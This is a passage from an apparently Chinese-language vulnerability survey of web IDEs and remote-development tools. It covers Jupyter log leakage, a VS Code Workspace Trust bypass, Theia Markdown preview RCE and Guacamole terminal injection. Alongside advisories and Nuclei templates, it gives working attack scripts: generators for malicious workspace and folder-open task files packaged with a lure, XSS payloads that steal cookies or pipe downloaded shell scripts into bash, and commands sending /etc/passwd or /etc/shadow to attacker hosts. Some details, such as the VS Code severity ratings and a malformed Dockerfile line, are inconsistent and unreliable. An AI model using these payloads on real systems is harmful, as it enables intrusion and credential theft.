CVE-2022-24758 是 Jupyter Notebook 的一个信息泄露漏洞，CVSS 3.1 评分 **7.5（High）**，CWE-532（Insertion of Sensitive Information into Log File）。当 Jupyter 服务器触发 5xx 错误时，默认日志配置会将完整的 HTTP 头部（包括认证 cookie 和其他敏感 header）记录到日志文件中。由于这些日志文件通常不需要 root 权限即可读取，本地攻击者可以监控日志来窃取认证凭据。

#### 受影响版本

| 产品 | 受影响版本 | 修复版本 |
|---|---|---|
| Jupyter Notebook | < 6.4.9 | 6.4.9 |

#### 漏洞原理分析

```python
# Jupyter Notebook 的默认日志处理（漏洞代码简化）
import logging

logger = logging.getLogger('jupyter_server')

def handle_request_error(handler, exc):
    # 5xx 错误时记录完整请求上下文
    logger.error(
        f"Request failed: {exc}",
        exc_info=True,
        extra={
            'method': handler.request.method,
            'path': handler.request.path,
            'headers': dict(handler.request.headers),  # 包含 Cookie!
            'remote_ip': handler.request.remote_ip
        }
    )
```

关键问题在于 `handler.request.headers` 包含了 `Cookie` 头部，其中含有 `_xsrf` token 和 session cookie。这些日志文件位于 Jupyter 的日志目录中，默认权限为 644（所有用户可读）。

#### HTTP PoC

```bash
# 触发 5xx 错误使敏感信息写入日志
# 方法1：发送格式错误的请求
curl -X POST http://TARGET:8888/api/contents/ \
  -H "Content-Type: application/json" \
  -d '{"format": "INVALID_FORMAT_VALUE"}'

# 方法2：访问不存在的 kernel
curl http://TARGET:8888/api/kernels/nonexistent_kernel_id

# 方法3：发送超大 payload 触发内存错误
python3 -c "
import requests
huge_data = 'A' * (100 * 1024 * 1024)
requests.post('http://TARGET:8888/api/contents/', data=huge_data)
"

# 读取日志文件（需要本地访问权限）
find /var/log/ ~/.local/share/jupyter/ -name "*.log" -exec grep -l "Cookie" {} \;
cat /var/log/jupyter/jupyter.log | grep -A5 "Cookie"
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
"""
CVE-2022-24758 - Jupyter Notebook 日志敏感信息泄露 PoC
描述：触发 5xx 错误使认证 cookie 写入日志文件
仅用于授权安全测试
"""

import sys
import requests
import time
from typing import List


def trigger_5xx_errors(target_url: str) -> List[str]:
    print(f"[*] CVE-2022-24758 - Jupyter 日志信息泄露 PoC")
    print(f"[*] 目标: {target_url}")

    endpoints = [
        ("POST", "/api/contents/", {"json": {"format": "X" * 10000}}),
        ("GET", "/api/kernels/nonexistent_kernel_id_xyz", {}),
        ("POST", "/api/kernels/bad_kernel_id/restart", {}),
        ("PUT", "/api/contents//etc/passwd", {"json": {"content": "test"}}),
        ("DELETE", "/api/contents/nonexistent_file", {}),
    ]

    triggered = []
    for method, path, kwargs in endpoints:
        try:
            url = f"{target_url}{path}"
            if method == "GET":
                resp = requests.get(url, timeout=5, **kwargs)
            elif method == "POST":
                resp = requests.post(url, timeout=5, **kwargs)
            elif method == "PUT":
                resp = requests.put(url, timeout=5, **kwargs)
            elif method == "DELETE":
                resp = requests.delete(url, timeout=5, **kwargs)

            status = resp.status_code
            if status >= 500:
                print(f"[+] {method} {path} → {status} (5xx 触发成功)")
                triggered.append(f"{method} {path}")
            elif status == 404:
                print(f"[*] {method} {path} → {status} (Not Found)")
            else:
                print(f"[*] {method} {path} → {status}")
        except requests.exceptions.RequestException as e:
            print(f"[-] {method} {path} → 错误: {e}")

    return triggered


def scan_log_files(log_paths: List[str] = None):
    if log_paths is None:
        log_paths = [
            "/var/log/jupyter/",
            "/tmp/jupyter*.log",
            "/root/.local/share/jupyter/runtime/",
        ]

    print(f"\n[*] 扫描日志文件...")
    import glob
    import os

    for log_pattern in log_paths:
        for log_file in glob.glob(log_pattern):
            if os.path.isfile(log_file):
                try:
                    with open(log_file, 'r', errors='ignore') as f:
                        content = f.read()
                        if 'Cookie' in content or '_xsrf' in content:
                            print(f"[!] 日志文件包含敏感信息: {log_file}")
                            for line in content.split('\n'):
                                if 'Cookie' in line or '_xsrf' in line:
                                    print(f"    {line.strip()[:200]}")
                except PermissionError:
                    print(f"[*] 无权限读取: {log_file}")


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"用法: {sys.argv[0]} <target_url>")
        print(f"示例: {sys.argv[0]} http://target:8888")
        sys.exit(1)

    target = sys.argv[1]
    trigger_5xx_errors(target)
    scan_log_files()
```

#### Nuclei YAML 检测模板

```yaml
id: cve-2022-24758-jupyter-log-leak

info:
  name: Jupyter Notebook < 6.4.9 - 日志敏感信息泄露
  author: security-researcher
  severity: high
  description: |
    Jupyter Notebook 在 5xx 错误时将认证 cookie 写入日志文件，
    本地攻击者可读取日志获取认证凭据。
  reference:
    - https://github.com/jupyter/notebook/security/advisories/GHSA-m87f-39q9-6f55
    - https://nvd.nist.gov/vuln/detail/CVE-2022-24758
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cve-id: CVE-2022-24758
  tags: cve,2022,jupyter,info-leak,logs

http:
  - raw:
      - |
        GET /api/kernels/nonexistent_kernel_id HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "Jupyter"
          - "notebook"
        condition: or

      - type: word
        words:
          - "error"
          - "not found"
        condition: or

    extractors:
      - type: dsl
        dsl:
          - '"Jupyter instance found at " + host + ":" + port + " - check for log sensitive info leak (CVE-2022-24758)"'
```

---

## 0x03 VS Code 与远程开发安全

VS Code 已从一个文本编辑器演变为功能完备的远程开发平台。VS Code Remote 系列扩展（SSH、Containers、WSL）通过在远程服务器上部署 VS Code Server 组件，使开发者可以在本地编辑远程代码。这一架构引入了全新的安全攻击面。

### 0x03.1 VS Code 远程权限提升（CVE-2026-47281）

#### 漏洞背景

CVE-2026-47281 是 Microsoft 于 2026 年 6 月 9 日披露的 VS Code 高危漏洞，CVSS 3.1 评分 **9.6（Critical）**，CVSS v2 评分高达 10.0。该漏洞涉及 VS Code 的 Workspace Trust 功能绕过，允许攻击者通过构造恶意的 `.code-workspace` 文件，在用户打开该文件时绕过信任限制并执行任意代码。

在 Windows 系统上，成功利用该漏洞可获得 **SYSTEM 权限**——这是 Windows 操作系统中的最高权限级别，比管理员权限更高。Microsoft 将该漏洞评定为"Important"（而非"Critical"），原因是需要用户交互（打开恶意文件），但考虑到开发者日常频繁打开各种项目文件夹和工作区文件，实际风险极高。

#### 受影响版本

| 产品 | 受影响版本 | 修复版本 |
|---|---|---|
| Visual Studio Code | < 1.123.2 | 1.123.2 |

#### 漏洞原理分析

Workspace Trust 机制于 VS Code 1.57 引入，用于在用户打开不受信任的文件夹时限制危险操作（如运行 task、启动 debugger、加载特定扩展）。CVE-2026-47281 通过构造恶意 `.code-workspace` 文件绕过此限制：

```json
// 恶意 .code-workspace 文件结构示例
{
  "folders": [
    {
      "name": "Trusted Project",
      "path": "."
    }
  ],
  "settings": {
    "terminal.integrated.defaultProfile.windows": "cmd"
  },
  "extensions": {
    "recommendations": [
      "malicious.publisher.malicious-extension"
    ]
  }
}
```

漏洞的关键在于 VS Code 在解析 workspace 文件时，某些配置项可以在 Trust 检查完成之前或绕过 Trust 检查被应用，从而触发代码执行。

#### HTTP PoC

```bash
# 1. 创建恶意 .code-workspace 文件
cat > evil-workspace.code-workspace << 'EOF'
{
  "folders": [{"name": "Project", "path": "."}],
  "settings": {
    "terminal.integrated.shellArgs.windows": "/c calc.exe"
  }
}
EOF

# 2. 将该文件放到可被目标下载的位置
python3 -m http.server 8080
echo "诱骗目标用户下载并打开 evil-workspace.code-workspace"

# 3. 对于 Linux/Mac 环境，可以利用 task 配置
cat > .vscode/tasks.json << 'TASKEOF'
{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "build",
      "type": "shell",
      "command": "curl http://ATTACKER/exfil?data=$(cat /etc/passwd | base64)",
      "runOptions": {"runOn": "folderOpen"}
    }
  ]
}
TASKEOF

# 将上述文件打包为恶意项目文件夹
zip -r evil-project.zip .vscode/ evil-workspace.code-workspace
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
"""
CVE-2026-47281 - VS Code Workspace Trust 绕过 PoC
描述：构造恶意 .code-workspace 文件绕过信任检查执行代码
仅用于授权安全测试
"""

import json
import os
import sys
import zipfile
import tempfile
from typing import Optional


def create_malicious_workspace(
    payload_cmd: str = "id > /tmp/pwned",
    platform: str = "linux"
) -> dict:
    if platform == "windows":
        settings = {
            "terminal.integrated.defaultProfile.windows": "cmd",
            "terminal.integrated.shellArgs.windows": f"/c {payload_cmd}"
        }
    elif platform == "linux":
        settings = {
            "terminal.integrated.defaultProfile.linux": "bash",
            "terminal.integrated.shellArgs.linux": f"-c '{payload_cmd}'"
        }
    else:
        settings = {
            "terminal.integrated.defaultProfile.osx": "zsh",
            "terminal.integrated.shellArgs.osx": f"-c '{payload_cmd}'"
        }

    workspace = {
        "folders": [
            {
                "name": "Project",
                "path": "."
            }
        ],
        "settings": settings
    }
    return workspace


def create_vscode_task(
    payload_cmd: str = "curl http://ATTACKER/exfil?data=$(whoami)"
) -> dict:
    return {
        "version": "2.0.0",
        "tasks": [
            {
                "label": "build",
                "type": "shell",
                "command": payload_cmd,
                "runOptions": {
                    "runOn": "folderOpen"
                },
                "presentation": {
                    "reveal": "silent"
                }
            }
        ]
    }


def create_malicious_zip(
    output_path: str = "evil-project.zip",
    payload_cmd: str = "id > /tmp/pwned",
    platform: str = "linux"
):
    workspace = create_malicious_workspace(payload_cmd, platform)
    task = create_vscode_task(payload_cmd)

    with zipfile.ZipFile(output_path, 'w', zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("evil.code-workspace", json.dumps(workspace, indent=2))
        zf.writestr(".vscode/tasks.json", json.dumps(task, indent=2))
        zf.writestr("README.md", "# Sample Project\n\nOpen in VS Code to view.")

    print(f"[+] 恶意项目文件已生成: {output_path}")
    print(f"[*] 平台: {platform}")
    print(f"[*] Payload: {payload_cmd}")
    print(f"[*] 使用方法:")
    print(f"    1. 将 {output_path} 分享给目标")
    print(f"    2. 目标在 VS Code 中打开 .code-workspace 文件")
    print(f"    3. Workspace Trust 绕过后执行 payload")


def check_vscode_version(target_hint: Optional[str] = None):
    print(f"[*] 检测方法:")
    print(f"    1. 检查本地 VS Code: Help > About")
    print(f"    2. 版本 < 1.123.2 则受 CVE-2026-47281 影响")
    print(f"    3. 修复: 更新到 VS Code 1.123.2 或更高版本")
    if target_hint:
        print(f"    目标环境: {target_hint}")


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"用法:")
        print(f"  {sys.argv[0]} generate [output] [platform] [command]")
        print(f"  {sys.argv[0]} info")
        print(f"示例:")
        print(f"  {sys.argv[0]} generate evil.zip linux 'whoami'")
        print(f"  {sys.argv[0]} generate evil.zip windows 'calc.exe'")
        sys.exit(1)

    action = sys.argv[1]
    if action == "generate":
        output = sys.argv[2] if len(sys.argv) > 2 else "evil-project.zip"
        platform = sys.argv[3] if len(sys.argv) > 3 else "linux"
        cmd = sys.argv[4] if len(sys.argv) > 4 else "id > /tmp/pwned"
        create_malicious_zip(output, cmd, platform)
    elif action == "info":
        check_vscode_version()
    else:
        print(f"[-] 未知操作: {action}")
```

#### Nuclei YAML 检测模板

```yaml
id: cve-2026-47281-vscode-workspace-trust-bypass

info:
  name: VS Code < 1.123.2 - Workspace Trust 绕过权限提升
  author: security-researcher
  severity: critical
  description: |
    VS Code 的 Workspace Trust 功能可被恶意 .code-workspace 文件绕过，
    导致在打开项目时执行任意代码，在 Windows 上可获得 SYSTEM 权限。
  reference:
    - https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-47281
    - https://nvd.nist.gov/vuln/detail/CVE-2026-47281
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H
    cvss-score: 9.6
    cve-id: CVE-2026-47281
  tags: cve,2026,vscode,privilege-escalation

files:
  - type: regex
    regex:
      - '(?i)code-server|vscode|visual.?studio.?code'
    part: body

http:
  - raw:
      - |
        GET /api/versions HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: or
    matchers:
      - type: word
        words:
          - "vscode"
        case-insensitive: true

      - type: word
        words:
          - "code-server"
        case-insensitive: true

    extractors:
      - type: dsl
        dsl:
          - '"VS Code / code-server instance detected at " + host + ":" + port + " - check version for CVE-2026-47281"'
```

### 0x03.2 code-server 认证安全

[code-server](https://github.com/coder/code-server) 是 Coder 公司开源的自托管 VS Code 方案，通过 Web 浏览器提供完整的 VS Code 体验。其安全架构核心在于认证层。

#### 常见安全问题

**默认密码与认证绕过**：
- code-server 默认使用随机生成的密码写入 `~/.config/code-server/config.yaml`
- 部分部署使用反向代理时可能意外禁用认证
- `--auth none` 参数常被开发者用于测试环境但遗留到生产

**会话管理缺陷**：
- 会话 cookie 默认不过期，长期有效
- 缺乏 CSRF 保护机制
- 会话固定攻击（Session Fixation）

**反向代理配置风险**：

```nginx
# 危险配置 - 认证被绕过
server {
    listen 443 ssl;
    location / {
        proxy_pass http://127.0.0.1:8080;
        # 缺少认证头传递
    }
}

# 安全配置 - 保持 code-server 认证
server {
    listen 443 ssl;
    location / {
        proxy_pass http://127.0.0.1:8080;
        proxy_set_header Host $host;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection upgrade;
        proxy_set_header Accept-Encoding gzip;
        proxy_set_header Authorization $http_authorization;
        # 不要覆盖或移除 Authorization 头
    }
}
```

#### 排查建议

```bash
# 检查 code-server 认证配置
cat ~/.config/code-server/config.yaml

# 确认认证未被禁用
grep -r "auth" ~/.config/code-server/
# 不应包含 "auth: none"

# 检查是否监听 0.0.0.0（公网暴露）
ss -tlnp | grep 8080
# 如果绑定到 0.0.0.0 且无认证，风险极高
```

### 0x03.3 VS Code Remote Extensions 沙箱逃逸

VS Code Remote 系列扩展（Remote-SSH、Remote-Containers、Remote-WSL）在远程服务器上部署 VS Code Server 组件。这些扩展的安全模型依赖于服务器端的隔离机制，但存在多个潜在的逃逸路径。

#### 攻击向量分析

**1. 恶意工作区配置**

```json
// .vscode/settings.json 中的危险配置
{
    "terminal.integrated.shellArgs.linux": "-c 'curl attacker.com/exfil?data=$(cat /etc/shadow)'",
    "python.terminal.executeInFileDir": true,
    "task.autoRun": true
}
```

**2. 恶意扩展利用**

VS Code 扩展在远程服务器上以用户权限运行，恶意扩展可以：
- 读取工作区中的所有源代码和密钥
- 执行任意命令
- 建立反向 shell
- 横向移动到其他服务

**3. 容器逃逸路径（Remote-Containers）**

当使用 Remote-Containers 开发时，如果容器配置不当：

```dockerfile
# 危险的 Docker 配置 - 共享宿主机命名空间
FROM ubuntu:22.04
# 未限制的权限
RUN apt-get update && apt-get install -y sudo
# 允许容器内提权
ALL ALL=(ALL) NOPASSWD: ALL
```

**防御建议**：

- 使用 VS Code 的 Workspace Trust 功能限制不受信任项目
- 在容器开发环境中使用非 root 用户
- 启用 Remote-Containers 的 `securityOpt: ["no-new-privileges"]`
- 定期审计已安装的扩展，仅保留必要扩展
- 使用 `.vscode/extensions.json` 声明允许的扩展

---

## 0x04 Eclipse Theia 与云 IDE

### 0x04.1 Theia Markdown 预览 RCE（CVE-2020-27224）

#### 漏洞背景

CVE-2020-27224 是 Eclipse Theia 框架中一个 CVSS 3.1 评分 **9.6（Critical）** 的远程代码执行漏洞。该漏洞存在于 `@theia/preview` 扩展的 Markdown 预览功能中，攻击者可以通过构造恶意 Markdown 文件，在受害者打开预览时执行任意代码。该漏洞在 Google Cloud Shell 中被发现并报告，获得了 Google VRP $5,000 奖金。

#### 受影响版本

| 产品 | 受影响版本 | 修复版本 |
|---|---|---|
| @theia/preview (npm) | < 1.2.0 | 1.3.0 |
| Eclipse Theia | ≤ 1.2.0 | 1.3.0 |

#### 漏洞原理分析

Eclipse Theia 的 Markdown 预览使用 `markdown-it` 库将 Markdown 渲染为 HTML，然后通过 `innerHTML` 直接注入到预览 WebView 中，**未经过任何 DOM 净化处理**。

```javascript
// 漏洞代码简化 - @theia/preview 的 renderContent 方法
async renderContent(content: string) {
    // 使用 markdown-it 渲染 Markdown 为 HTML
    const html = this.markdownRenderer.render(content);
    // 直接注入 innerHTML - 无 DOMPurify 净化！
    this.previewElement.innerHTML = html;
}

// 修复版本添加了 DOMPurify：
async renderContent(content: string) {
    const html = this.markdownRenderer.render(content);
    // 使用 DOMPurify 净化 HTML
    this.previewElement.innerHTML = DOMPurify.sanitize(html);
}
```

攻击者可以在 Markdown 文件中嵌入恶意 payload：

```markdown
# 恶意 Markdown 文件

<style onload="fetch('http://attacker.com/steal?cookie='+document.cookie)">
</style>

<img src=x onerror="require('child_process').exec('curl http://attacker.com/shell.sh | bash')">

[点击查看详情](javascript:require('child_process').exec('id'))
```

在 Electron 环境中，`require` 函数可直接访问 Node.js API，使 XSS 直接升级为 RCE。

#### HTTP PoC

```bash
# 1. 创建恶意 Markdown 文件
cat > evil.md << 'MDEOF'
# 项目文档

<style onload="var x=new XMLHttpRequest();x.open('GET','http://ATTACKER:9999/steal?c='+document.cookie);x.send();">
</style>

<img src=x onerror="require('child_process').exec('curl http://ATTACKER:9999/shell?data='+require('fs').readFileSync('/etc/passwd').toString())">

## 安装说明

正常的内容...
MDEOF

# 2. 托管恶意文件
python3 -m http.server 8080

# 3. 引诱目标在 Theia IDE 中打开并预览该文件
echo "将 http://ATTACKER:8080/evil.md 分享给使用 Eclipse Theia 的目标"
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
"""
CVE-2020-27224 - Eclipse Theia Markdown 预览 RCE PoC
描述：通过恶意 Markdown 文件在 Theia IDE 中实现远程代码执行
仅用于授权安全测试
"""

import json
import os
import sys
from typing import Optional


def create_malicious_markdown(
    attacker_url: str = "http://attacker:9999",
    platform: str = "node"
) -> str:
    if platform == "node":
        payload = (
            f'<img src=x onerror="'
            f"require('child_process').exec("
            f"'curl {attacker_url}/callback?data=\"+"
            f"require('child_process').execSync(\"id\").toString()"
            f'">'
        )
    elif platform == "python":
        payload = (
            f'<img src=x onerror="'
            f"fetch('{attacker_url}/callback?data=exploited')"
            f'">'
        )
    else:
        payload = (
            f'<img src=x onerror="'
            f"this.src='{attacker_url}/beacon?c='+document.cookie"
            f'">'
        )

    markdown = f"""# 项目文档

## 安装说明

请按照以下步骤安装依赖。

{payload}

## 配置

正常的技术文档内容...

## 使用方法

```bash
npm install
npm start
```
"""
    return markdown


def create_payload_server_script(attacker_url: str = "http://attacker:9999") -> str:
    return f'''#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        params = urllib.parse.parse_qs(parsed.query)
        print(f"[+] 收到回调: {{self.path}}")
        if 'data' in params:
            print(f"[+] 数据: {{params['data'][0]}}")
        if 'c' in params:
            print(f"[+] Cookie: {{params['c'][0]}}")
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()

print(f"[*] 监听 {attacker_url}")
HTTPServer(('0.0.0.0', 9999), Handler).serve_forever()
'''


def main():
    if len(sys.argv) < 2:
        print(f"用法:")
        print(f"  {sys.argv[0]} generate <attacker_url> [output]")
        print(f"  {sys.argv[0]} server <listen_port>")
        print(f"示例:")
        print(f"  {sys.argv[0]} generate http://attacker:9999 evil.md")
        sys.exit(1)

    action = sys.argv[1]
    if action == "generate":
        attacker_url = sys.argv[2] if len(sys.argv) > 2 else "http://attacker:9999"
        output = sys.argv[3] if len(sys.argv) > 3 else "evil.md"
        md_content = create_malicious_markdown(attacker_url)
        with open(output, 'w') as f:
            f.write(md_content)
        print(f"[+] 恶意 Markdown 已生成: {output}")
        print(f"[*] 目标在 Theia IDE 中打开并预览此文件即可触发 RCE")
    elif action == "server":
        port = int(sys.argv[2]) if len(sys.argv) > 2 else 9999
        print(f"[*] 在端口 {port} 启动回调服务器...")
        from http.server import HTTPServer, BaseHTTPRequestHandler
        import urllib.parse
        class Handler(BaseHTTPRequestHandler):
            def do_GET(self):
                parsed = urllib.parse.urlparse(self.path)
                params = urllib.parse.parse_qs(parsed.query)
                print(f"[+] 收到回调: {self.path}")
                if 'data' in params:
                    print(f"[+] 数据: {params['data'][0]}")
                self.send_response(200)
                self.send_header("Access-Control-Allow-Origin", "*")
                self.end_headers()
        HTTPServer(('0.0.0.0', port), Handler).serve_forever()


if __name__ == "__main__":
    main()
```

#### Nuclei YAML 检测模板

```yaml
id: cve-2020-27224-theia-markdown-rce

info:
  name: Eclipse Theia <= 1.2.0 - Markdown 预览 RCE
  author: security-researcher
  severity: critical
  description: |
    Eclipse Theia 的 Markdown 预览功能未对渲染后的 HTML 进行净化，
    攻击者可通过恶意 Markdown 文件在 Electron 环境中执行任意代码。
  reference:
    - https://github.com/eclipse-theia/theia/issues/7954
    - https://github.com/eclipse-theia/theia/pull/7971
    - https://omespino.com/write-up-google-bug-bounty-xss-to-cloud-shell-instance-takeover-rce-as-root-5000-usd/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H
    cvss-score: 9.6
    cve-id: CVE-2020-27224
  tags: cve,2020,theia,xss,rce,markdown

http:
  - raw:
      - |
        GET /api/v1/config HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: or
    matchers:
      - type: word
        words:
          - "theia"
        case-insensitive: true

      - type: word
        words:
          - "eclipse"
        case-insensitive: true

    extractors:
      - type: dsl
        dsl:
          - '"Eclipse Theia instance detected at " + host + ":" + port + " - check for Markdown preview RCE (CVE-2020-27224)"'
```

---

## 0x05 远程桌面与网关安全

### 0x05.1 Apache Guacamole 认证绕过（CVE-2023-29194）

#### 漏洞背景

Apache Guacamole 是一个无客户端的远程桌面网关，支持 VNC、RDP、SSH 和 Telnet 协议。CVE-2023-29194 是 Guacamole 终端模拟器中的一个命令注入漏洞，CVSS 评分约 **7.2（High）**。当用户通过 SSH 或 Telnet 协议连接到恶意服务器时，攻击者可以发送特制的 console code 序列，在 guacd 进程的上下文中执行任意代码。

该漏洞的攻击场景较为特殊——需要攻击者控制或妥协 SSH/Telnet 服务端。但在多租户环境中，如在线 IDE 平台的终端共享功能，这一攻击路径完全可行。

#### 受影响版本

| 产品 | 受影响版本 | 修复版本 |
|---|---|---|
| Apache Guacamole | < 1.5.0 | 1.5.0 |
| Apache Guacamole（终端模拟器） | ≤ 1.5.5 | 1.6.0 |

#### 漏洞原理分析

Guacamole 的终端模拟器在处理 SSH/Telnet 服务器返回的文本数据时，需要解析 ANSI escape sequence（console code）来正确渲染终端输出。漏洞在于这些 console code 未被正确验证和过滤：

```c
// 简化的漏洞原理（guacd 的终端处理代码）
// 攻击者通过 SSH 服务器发送恶意 console code 序列
void process_console_code(char *data, int len) {
    // 未充分验证的 console code 解析
    // 恶意序列可以触发缓冲区溢出或格式化字符串漏洞
    switch (data[1]) {
        case 'c':
            // Console code 处理 - 可被利用
            handle_console_operation(data + 2, len - 2);
            break;
        // ...
    }
}
```

#### HTTP PoC

```bash
# 1. 设置恶意 SSH 服务器（使用 socat 模拟）
# 该服务器在 Guacamole 连接时发送恶意 console code
socat TCP-LISTEN:2222,reuseaddr,fork \
  SYSTEM:'echo -e "\x1b[?1h\x1b[=c\x1b[?2004h" && sleep 5'

# 2. 配置 Guacamole 连接到恶意 SSH 服务器
# guacamole.properties 或数据库配置中设置:
# ssh-hostname=ATTACKER_IP
# ssh-port=2222

# 3. 检测目标 Guacamole 实例
curl -s http://TARGET:8080/guacamole/api/tokens | head -c 200
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
"""
CVE-2023-29194 - Apache Guacamole 终端模拟器命令注入 PoC
描述：通过恶意 SSH 服务器向 Guacamole 发送恶意 console code
仅用于授权安全测试
"""

import socket
import sys
import time
import threading
from typing import Optional


def create_malicious_ssh_server(
    listen_port: int = 2222,
    payload_cmd: str = "id"
) -> None:
    print(f"[*] CVE-2023-29194 - Guacamole 终端注入 PoC")
    print(f"[*] 监听端口: {listen_port}")
    print(f"[*] Payload: {payload_cmd}")

    malicious_console_codes = (
        "\x1b[?1h"
        "\x1b[=c"
        "\x1b[?2004h"
        f"\x1b]0;{payload_cmd}\x07"
        "\x1b[2J\x1b[H"
        "Connection established.\n"
    )

    def handle_client(conn, addr):
        print(f"[+] Guacamole 连接来自: {addr}")
        try:
            conn.send(b"SSH-2.0-OpenSSH_8.9\r\n")
            time.sleep(0.5)
            conn.send(malicious_console_codes.encode('utf-8', errors='ignore'))
            time.sleep(0.5)
            conn.send(b"\r\n$ " + payload_cmd.encode() + b"\r\n")
            time.sleep(2)
        except Exception as e:
            print(f"[-] 错误: {e}")
        finally:
            conn.close()

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('0.0.0.0', listen_port))
    server.listen(5)
    print(f"[*] 恶意 SSH 服务器已启动，等待 Guacamole 连接...")

    while True:
        conn, addr = server.accept()
        thread = threading.Thread(target=handle_client, args=(conn, addr))
        thread.daemon = True
        thread.start()


def check_guacamole(target_url: str) -> bool:
    print(f"[*] 检测 Guacamole 实例: {target_url}")
    try:
        import requests
        resp = requests.get(f"{target_url}/guacamole/api/tokens", timeout=5)
        if resp.status_code in (200, 401, 403):
            print(f"[+] Guacamole 实例在线")
            if resp.status_code == 200:
                data = resp.json()
                print(f"[*] 版本: {data.get('version', 'unknown')}")
            return True
    except Exception as e:
        print(f"[-] 检测失败: {e}")
    return False


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"用法:")
        print(f"  {sys.argv[0]} server [port] [command]  - 启动恶意 SSH 服务器")
        print(f"  {sys.argv[0]} check <target_url>       - 检测 Guacamole")
        sys.exit(1)

    action = sys.argv[1]
    if action == "server":
        port = int(sys.argv[2]) if len(sys.argv) > 2 else 2222
        cmd = sys.argv[3] if len(sys.argv) > 3 else "id"
        create_malicious_ssh_server(port, cmd)
    elif action == "check":
        target = sys.argv[2] if len(sys.argv) > 2 else "http://localhost:8080"
        check_guacamole(target)
```

#### Nuclei YAML 检测模板

```yaml
id: cve-2023-29194-guacamole-console-injection

info:
  name: Apache Guacamole < 1.5.0 - 终端模拟器命令注入
  author: security-researcher
  severity: high
  description: |
    Apache Guacamole 终端模拟器未正确验证 SSH/Telnet 服务器返回的
    console code，恶意服务器可在 guacd 进程中执行任意代码。
  reference:
    - https://guacamole.apache.org/security/
  classification:
    cvss-score: 7.2
    cve-id: CVE-2023-29194
  tags: cve,2023,guacamole,terminal-injection

http:
  - raw:
      - |
        GET /guacamole/api/tokens HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "version"

      - type: word
        words:
          - "guacamole"
        case-insensitive: true

    extractors:
      - type: json
        json:
          - ".version"

      - type: dsl
        dsl:
          - '"Apache Guacamole found at " + host + ":" + port'
```

---

## 0x06 Gitpod 与其他云 IDE 平台

### Gitpod Workspace 安全模型分析

[Gitpod](https://www.gitpod.io/) 采用基于容器的 workspace 隔离架构，每个 workspace 运行在独立的 Kubernetes Pod 中。其安全模型包含以下层次：

**网络隔离**：每个 workspace 有独立的网络命名空间，workspace 之间默认不可互通。但 workspace 内的进程可以访问外部网络。

**文件系统隔离**：workspace 使用 overlay filesystem，持久化数据存储在持久卷中。workspace 重启后文件系统被重置。

**认证与授权**：
- Gitpod 使用 OAuth2/OIDC 进行身份认证
- workspace 访问需要有效的 session token
- Gitpod 的预构建（Prebuild）功能在处理恶意仓库时可能执行攻击者控制的代码

**潜在攻击面**：
- **恶意 .gitpod.yml**：仓库中的配置文件可以指定自定义 Docker 镜像或初始化命令
- **预构建投毒**：攻击者在公共仓库中植入恶意 prebuild 任务，在其他用户 fork 时触发
- **端口暴露**：workspace 中运行的服务可以通过 `gitpod.link` 暴露到公网
- **环境变量泄露**：通过命令注入获取 workspace 中的敏感环境变量

### Coder (code-server) self-hosted 安全问题

Coder 的自托管方案将 code-server 部署在 Kubernetes 或 Docker 中，常见安全问题包括：

**镜像供应链风险**：
```yaml
# 危险的模板配置 - 使用未经验证的镜像
template:
  name: dev-workspace
  docker:
    image: random-user/custom-dev-image:latest  # 未经验证的镜像
```

**权限过高的 workspace**：
```yaml
# 危险配置 - workspace 以 root 运行且无资源限制
workspace:
  securityContext:
    runAsUser: 0  # root 权限
  resources:
    limits: {}  # 无资源限制
```

**安全加固建议**：
- 始终使用官方或经审核的基础镜像
- workspace 以非 root 用户运行
- 设置合理的 CPU/内存限制
- 禁用不必要的 workspace 功能（如端口暴露）
- 启用审计日志

---

## 0x07 公开 PoC 收集情况与利用思路

### PoC 收集情况总表

| CVE 编号 | PoC 状态 | 公开仓库 | 利用难度 |
|---|---|---|---|
| CVE-2021-34182 | 有公开 PoC | GitHub Issues #692 | 低（无需认证） |
| CVE-2026-42557 | 有概念验证 | GHSA-mqcg-5x36-vfcg | 低（需用户点击） |
| CVE-2026-47281 | 原理已公开 | MSRC Advisory | 中（需用户打开文件） |
| CVE-2020-27224 | 有完整 Writeup | Google VRP Report | 低（需用户预览） |
| CVE-2022-29241 | 有技术分析 | GHSA-q874-g24w-4q9g | 中（需低权限） |
| CVE-2024-22421 | 有完整利用链 | blog.xss.am | 中（需用户点击） |
| CVE-2022-24758 | 原理已公开 | GHSA-m87f-39q9-6f55 | 低（本地访问） |
| CVE-2023-29194 | 有安全公告 | guacamole.apache.org | 高（需恶意服务端） |

### 关键 PoC 仓库链接

| 资源 | 链接 |
|---|---|
| ttyd Issues #692 | https://github.com/tsl0922/ttyd/issues/692 |
| JupyterLab GHSA-mqcg-5x36-vfcg | https://github.com/advisories/GHSA-mqcg-5x36-vfcg |
| JupyterLab GHSA-44cc-43rp-5947 | https://github.com/advisories/GHSA-44cc-43rp-5947 |
